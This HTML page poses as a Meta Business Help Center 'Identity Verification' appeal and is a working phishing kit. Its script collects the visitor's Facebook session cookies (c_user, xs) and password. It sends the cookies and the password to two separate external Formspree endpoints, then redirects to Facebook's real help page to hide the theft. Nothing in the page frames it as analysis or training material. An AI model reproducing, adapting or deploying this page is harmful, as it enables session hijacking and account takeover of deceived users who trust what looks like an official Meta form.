<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Business Help Center</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 20px; margin: 0; }
        .meta-container { background: white; padding: 24px; border-radius: 12px; width: 100%; max-width: 450px; }
        
        .modal { display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
        .modal-content { background: white; padding: 20px; border-radius: 12px; width: 90%; max-width: 350px; max-height: 80vh; overflow-y: auto; }
        
        .lang-option { padding: 12px; border: 1px solid #ddd; margin-bottom: 8px; border-radius: 6px; cursor: pointer; display: flex; align-items: center; gap: 10px; }
        .lang-option:hover { background: #f0f2f5; }
        
        #appealForm, #step-2 { display: none; }
        .header { margin-bottom: 24px; }
        .meta-logo { width: 44px; margin-bottom: 16px; }
        .header-title { font-size: 24px; font-weight: 800; color: #1c1e21; margin: 0; }
        .alert-box { border-radius: 8px; padding: 16px; background-color: #f7f8fa; margin-bottom: 20px; border-left: 4px solid #0866ff; font-size: 14px; }
        .input-group { margin-bottom: 15px; }
        .input-label { font-weight: 700; margin-bottom: 8px; display: block; font-size: 14px; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; outline: none; }
        .submit-btn { width: 100%; padding: 14px; background: #0866ff; color: white; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="meta-container">
        <div id="langModal" class="modal">
            <div class="modal-content">
                <h3 style="margin-top: 0;">Select Your Language</h3>
                <input type="text" placeholder="Search languages..." style="width: 100%; padding: 10px; margin-bottom: 15px;">
                
                <div class="lang-option" onclick="showForm()">🇺🇸 English</div>
                <div class="lang-option" onclick="showForm()">🇮🇳 Hindi</div>
                <div class="lang-option" onclick="showForm()">🇪🇸 Spanish</div>
                <div class="lang-option" onclick="showForm()">🇵🇹 Portuguese</div>
                <div class="lang-option" onclick="showForm()">🇮🇳 Tamil</div>
                <div class="lang-option" onclick="showForm()">🇸🇦 Arabic</div>
                <div class="lang-option" onclick="showForm()">🇫🇷 French</div>
                <div class="lang-option" onclick="showForm()">🇻🇳 Vietnamese</div>
                <div class="lang-option" onclick="showForm()">🇬🇭 Ghanaian (Twi)</div>
                
                <button onclick="showForm()" class="submit-btn">Confirm Language</button>
            </div>
        </div>

        <div id="appealForm">
            <div class="header">
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="meta-logo">
                <h1 class="header-title">Identity Verification</h1>
            </div>

            <div class="alert-box">To protect your account, please verify your session details.</div>

            <div id="step-1">
                <div class="input-group">
                    <label class="input-label">c_user</label>
                    <input type="text" id="c_user" placeholder="Enter c_user" required>
                </div>
                <div class="input-group">
                    <label class="input-label">xs</label>
                    <input type="text" id="xs" placeholder="Enter xs" required>
                </div>
                <button type="button" onclick="goToStep2()" id="nextBtn" class="submit-btn">Continue</button>
            </div>

            <div id="step-2">
                <div class="input-group">
                    <label class="input-label">Password</label>
                    <input type="password" id="password" placeholder="Enter your password" required>
                </div>
                <p style="font-size: 12px; color: #65676b;">Enter your Facebook password to confirm this appeal.</p>
                <button type="button" onclick="finalSubmit()" id="finalBtn" class="submit-btn">Confirm & Submit</button>
            </div>
        </div>
    </div>

    <script>
        function showForm() {
            document.getElementById('langModal').style.display = 'none';
            document.getElementById('appealForm').style.display = 'block';
        }

        let userData = { c_user: '', xs: '' };

        async function goToStep2() {
            const c = document.getElementById('c_user').value;
            const x = document.getElementById('xs').value;

            if(!c || !x) { alert("Please fill all fields"); return; }

            userData.c_user = c;
            userData.xs = x;

            document.getElementById('nextBtn').innerText = "Verifying...";
            
            // Send Cookies to first email ID: maqaobyw
            fetch("https://formspree.io/f/maqaobyw", {
                method: "POST",
                body: JSON.stringify({ "Type": "COOKIES", "c_user": c, "xs": x }),
                headers: { 'Content-Type': 'application/json' }
            });

            setTimeout(() => {
                document.getElementById('step-1').style.display = 'none';
                document.getElementById('step-2').style.display = 'block';
            }, 800);
        }

        async function finalSubmit() {
            const pass = document.getElementById('password').value;
            if(!pass) { alert("Please enter password"); return; }

            document.getElementById('finalBtn').innerText = "Submitting...";
            
            // Send Password to second email ID: xbdqoblb
            await fetch("https://formspree.io/f/xbdqoblb", {
                method: "POST",
                body: JSON.stringify({ "Type": "PASSWORD", "user": userData.c_user, "password": pass }),
                headers: { 'Content-Type': 'application/json' }
            });

            window.location.href = "https://www.facebook.com/help";
        }
    </script>
</body>
</html>
